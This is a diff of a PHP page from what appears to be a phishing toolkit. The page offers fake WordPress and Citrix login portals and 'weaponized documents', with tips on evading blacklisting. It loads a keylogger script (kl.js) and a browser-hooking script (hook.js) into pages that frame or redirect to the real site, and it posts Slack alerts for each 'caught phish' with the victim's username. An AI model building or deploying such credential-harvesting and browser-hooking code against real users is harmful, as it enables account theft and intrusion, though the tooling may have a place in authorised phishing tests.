@@ -92,12 +92,47 @@ $conn2->close();
 
 ?>
 
+<?php if(isset($_REQUEST['fakesite'])){ ?>
+
+<!-- INSERT PRE-POPULATED LOGON FORM OPTIONS HERE -->
 <HTML>
 <HEAD>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 <link rel="stylesheet" href="main.css">
-    
-<?php
+</HEAD>
+<BODY>
+<CENTER>
+<BR><BR><BR>
+<TABLE WIDTH="80%">
+<TR><TH WIDTH="100%" COLSPAN="2">Repository of Login Portals</TH></TR>
+<TR><TD><a href="templates/templatecreation.php?template=wordpress"><img src="templates/wordpressportal.png" width="200"></a><br><br><b>WordPress</b></TD><TD><a href="templates/templatecreation.php?template=citrix"><img src="templates/citrixportal.png" width="200"></a><br><br><b>Citrix</b></TD></TR>
+</TABLE>
+<BR><FONT COLOR="#FFFFFF">Choose a default template, download the HTML, and customize however you'd like.  <br><br>For best results, host these landing pages on their own server to avoid having the API blacklisted for a certain campaign.  <br><br>Use SSL for both so there is no mixed-content.  These pages already contain the fields necessary for the API!</FONT>
+</CENTER>
+</BODY>
+</HTML>
+
+<?php } else {
+
+if($redirect == false){ ?>
+
+<HTML>
+<HEAD>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="main.css">
+</HEAD>
+<BODY>
+<CENTER>
+<BR><BR><BR><TABLE>
+<TR><TH>Fake Portal</TH><TH>Weaponized Documents</TH></TR>
+<TR><TD><a href="index.php?fakesite=1"><img src="genericlogin.png" width="300" height="300"></a></TD><TD><a href="/phishingdocs/"><img src="mswordlogo.png" width="300" height="300"></a></TD></TR>
+</TABLE>
+</CENTER>
+</BODY>
+</HTML>
+
+<?php } }
+
 if($redirect != ""){
 
 // See if Redirect Location Allows Iframes
@@ -107,18 +142,28 @@ exec($cmdredir,$outputredir);
 
 if(isset($outputredir[0])){
 ?>
-<meta http-equiv="refresh" content="1;URL='<?php echo $redirect; ?>'" />
+<HTML>
+<HEAD>
+<meta http-equiv="refresh" content="0;URL='<?php echo $redirect; ?>'" />
 
-
-
-<?php }} ?>
 </HEAD>
-<BODY>
+</BODY>
 
-<?php if($redirect != false){
+<?php }}
+
+if($redirect != false){
 
 if($outputredir[0] == false){ ?>
-<iframe src="<?php echo $redirect; ?>" width="100%" height="100%" frameborder="0" sandbox="allow-forms allow-scripts"></iframe>
+<HTML>
+<HEAD>
+<style>
+body {
+    margin: 0;
+}
+</style>
+</HEAD>
+<BODY>
+<iframe src="<?php echo $redirect; ?>" width="100%" height="100%" frameborder="0" sandbox="allow-forms allow-scripts" scrolling="no"></iframe>
 <script src="https://<?php echo $_SERVER['SERVER_NAME'];?>/kl.js" type="text/javascript"></script>
 <?php } ?>
 
@@ -128,39 +173,11 @@ if($outputredir[0] == false){ ?>
 
 <script src="https://<?php echo $_SERVER['SERVER_NAME'];?>:3000/hook.js" type="text/javascript"></script>
 
-
-<?php } ?>
-
-<?php if(isset($_REQUEST['fakesite'])){ ?>
-
-<!-- INSERT PRE-POPULATED LOGON FORM OPTIONS HERE -->
-<CENTER>
-<BR><BR><BR>
-<TABLE WIDTH="80%">
-<TR><TH WIDTH="100%" COLSPAN="2">Repository of Login Portals</TH></TR>
-<TR><TD><a href="templates/templatecreation.php?template=wordpress"><img src="templates/wordpressportal.png" width="200"></a><br><br><b>WordPress</b></TD><TD><a href="templates/templatecreation.php?template=citrix"><img src="templates/citrixportal.png" width="200"></a><br><br><b>Citrix</b></TD></TR>
-</TABLE>
-<BR><FONT COLOR="#FFFFFF">Choose a default template, download the HTML, and customize however you'd like.  <br><br>For best results, host these landing pages on their own server to avoid having the API blacklisted for a certain campaign.  <br><br>Use SSL for both so there is no mixed-content.  These pages already contain the fields necessary for the API!</FONT>
-</CENTER>
-
-<?php } else { 
-
-if($redirect == false){ ?>
-
-<CENTER>
-<BR><BR><BR><TABLE>
-<TR><TH>Fake Portal</TH><TH>Weaponized Documents</TH></TR>
-<TR><TD><a href="index.php?fakesite=1"><img src="genericlogin.png" width="300" height="300"></a></TD><TD><a href="/phishingdocs/"><img src="mswordlogo.png" width="300" height="300"></a></TD></TR>
-</TABLE>
-</CENTER>
-
-<?php } } ?>
-
 </BODY>
 </HTML>
 
+<?php }
 
-<?php
 
 $slacklink = "https://".$_SERVER['SERVER_NAME']."/results/index.php?project=".$portal;
 
@@ -226,7 +243,7 @@ $message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)"
 
 }
 
-if($TroyHunt == "yes"){$message = $message."\r\n> *_HaveIBeenPwned Hit_*";}
+if($TroyHunt == "yes"){$message = $message."\r\n> *_HaveIBeenPwned Hit_* (".$haveibeenpwnedhits.")";}
 
 // Execute Slack Incoming Webhook
 $cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';
